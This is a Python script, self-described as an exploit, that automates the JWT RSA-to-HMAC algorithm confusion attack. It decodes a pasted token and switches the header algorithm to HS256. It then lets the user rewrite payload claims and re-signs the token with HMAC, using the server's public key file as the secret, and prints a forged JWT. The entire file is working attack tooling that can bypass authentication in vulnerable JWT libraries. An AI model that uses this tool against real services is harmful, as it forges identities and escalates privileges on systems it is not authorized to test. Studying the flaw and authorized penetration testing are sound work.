#! /usr/bin/env python3

# JWT vulnerability RSA -> HMAC exploit

import os
import sys
import re
import hmac
import base64
import hashlib

JWT_NUM_PARTS = 3
JWT_DELIMITER='.'

JSON_REWRITE = 'RE'
ENC_DEC_FORMAT_DEFAULT = 'utf8'

KEY_IS_SUCCESS = 'isSuccess';
KEY_JSON = 'json';

encDecFormat = ENC_DEC_FORMAT_DEFAULT
currentState = ''
currentStep = 1

# prints, prompts etc
# -------------------

def intro():
    printLine()
    print("""
EXPLOIT JWT RSA -> HMAC VULNERABILITY

description
    https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

manual walkthrough
    https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/

how to use this exploit
    - carefully read the prompts
    - input requested data
    - if the exploit crashes, read the error
    - if everything's fine, you get the modified JWT in the end
    """)
    iterateStep()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def printLine():
    print('*****************************************')

def iterateStep():
    global currentStep
    printLine()
    print('\nSTEP {}:\n'.format(currentStep))
    currentStep += 1

def refreshState(newLine, nextStepExists = True):
    global currentState
    currentState += newLine + '\n'
    clear()
    print('CURRENT STATE:\n')
    printLine()
    print(currentState)
    if nextStepExists:
        iterateStep()

def printJWTSection(sectionName, sectionContent):
    print("""
modify JWT {sectionName}
current {sectionName} content is: {sectionContent}
\n
    """.format(
        sectionName = sectionName,
        sectionContent = sectionContent
    ))

def promptWithNewLine(prompt):
    prompt = 'input {}'.format(prompt)
    prompt += ':\n'

    return input(prompt)

def promptWithDefault(promptText, defaultValue):
    prompt = promptText
    if '' != defaultValue:
        prompt += ' (press Enter for default "{}")'.format(defaultValue)

    return promptWithNewLine(prompt) or defaultValue

def printFinalJWT(finalJWT):
    refreshState('\n...FINISHED', nextStepExists = False)
    printLine()
    print('exploited JWT')
    printLine()
    print(finalJWT)
    print('\n\n')

# extract and modify JSON
# -----------------------

def processJson(dataType, defKey, defVal, encoded):
    jsonOriginal = deBase64(encoded)
    printJWTSection(dataType, jsonOriginal)
    jsonModified = getJsonModified(defKey, defVal, jsonOriginal)

    stateNewLine = 'modified {dataType}: {jsonModified}'.format(
        dataType = dataType,
        jsonModified = jsonModified
    )
    refreshState(stateNewLine)

    return jsonModified

def getJsonModified(defKey, defVal, jsonUnmodified):
    json = jsonUnmodified
    keyPrompt = """the name of the key, for which you want 
to change a value, without quotes;
[to rewrite entire JSON, input {}]"""
    key = promptWithDefault(keyPrompt.format(JSON_REWRITE), defKey)

    if JSON_REWRITE == key:
        json = promptWithNewLine('entirely new JSON')

    elif '' != key:
        valPrompt = 'value for key "{}"'.format(key)
        val = promptWithDefault(valPrompt, defVal)

        result = doReplaceJsonValue(json, key, val, '{key}":"[^"]*"', '{key}":"{val}"')
        if result[KEY_IS_SUCCESS]:
            return result[KEY_JSON]

        result = doReplaceJsonValue(json, key, val, '{key}":\d', '{key}":{val}')
        if result[KEY_IS_SUCCESS]:
            return result[KEY_JSON]

    return result['json']

def doReplaceJsonValue(json, key, val, patternSearch, patternReplace):
    patternSearch = patternSearch.format(
        key = key
    )
    regExp = re.compile(patternSearch)
    match = regExp.search(json)

    if match is None:
        return getJsonValueReplaceResult(False, json)

    replace = patternReplace.format(
        key = key, val = val
    )
    json = regExp.sub(replace, json)

    return getJsonValueReplaceResult(True, json)

def getJsonValueReplaceResult(isSuccess, json):
    
    return {KEY_IS_SUCCESS: isSuccess, KEY_JSON: json}
  

# Base64 endcode / decode
#------------------------

def deBase64(encodedStr):
    # avoid error by adding arbitrary amount of paddings;
    # extraneous padding will be ignored
    withPadding = encodedStr + '========'

    b64Bytes = withPadding.encode(encDecFormat)
    msgBytes = base64.b64decode(b64Bytes)

    return msgBytes.decode(encDecFormat)

def enBase64(rawStr):
    msgBytes = rawStr.encode(encDecFormat)
    b64Bytes = base64.b64encode(msgBytes)

    # JWT version of Base64 does not have paddings
    return b64Bytes.decode(encDecFormat).rstrip('=')

# get bytes
# ---------

def getKeyBytes():
    prompt='the path to the key file \n(current dir is {})'.format(os.getcwd())
    keyFilePath = promptWithNewLine(prompt)

    file = open(keyFilePath)
    key = file.read()

    refreshState('key loaded from file: {}'.format(keyFilePath))

    return bytes(key, encoding = encDecFormat)

# main
# ----

def getEncDecFormat():
    global encDecFormat
    formatPrompt = 'encoding / decoding format'
    encDecFormat = promptWithDefault(formatPrompt, ENC_DEC_FORMAT_DEFAULT)

    stateNewLine = '{formatPrompt}: {encDecFormat}'.format(
        formatPrompt = formatPrompt,
        encDecFormat = encDecFormat
    )
    refreshState(stateNewLine)

    return encDecFormat

def getJWTParts():
    jwtRaw = input('paste JWT and press Enter\n')
    parts = jwtRaw.split(JWT_DELIMITER)

    jwtLen = len(parts)
    if JWT_NUM_PARTS != jwtLen:
        print('JWT is invalid, expected {expected} elements, got {got}'.format(
            expected = JWT_NUM_PARTS, got = jwtLen
        ))
        sys.exit(1)

    refreshState('current JWT: accepted and parsed')

    return parts

def getSignature(keyBytes, tokenBytes):
    hmacDigest = hmac.new(keyBytes, tokenBytes, hashlib.sha256).digest()

    # TODO: try to use enBase64() and see if it works (after update to urlsafe_b64encode() there)
    return base64.urlsafe_b64encode(hmacDigest).decode(encDecFormat).rstrip('=')

def run():
    clear()
    intro()

    parts = getJWTParts()

    encDecFormat = getEncDecFormat()

    headerJson = processJson('header', 'alg', 'HS256', parts[0])
    payloadJson = processJson('payload', '', '', parts[1])

    tokenRaw = '{header}.{payload}'.format(
        header = enBase64(headerJson),
        payload = enBase64(payloadJson)
    )

    keyBytes = getKeyBytes()
    tokenBytes = tokenRaw.encode(encDecFormat)

    signature = getSignature(keyBytes, tokenBytes)

    finalJWT = '{tokenRaw}.{signature}'.format(
        tokenRaw = tokenRaw,
        signature = signature
    )

    printFinalJWT(finalJWT)

if __name__ == "__main__":
   run()
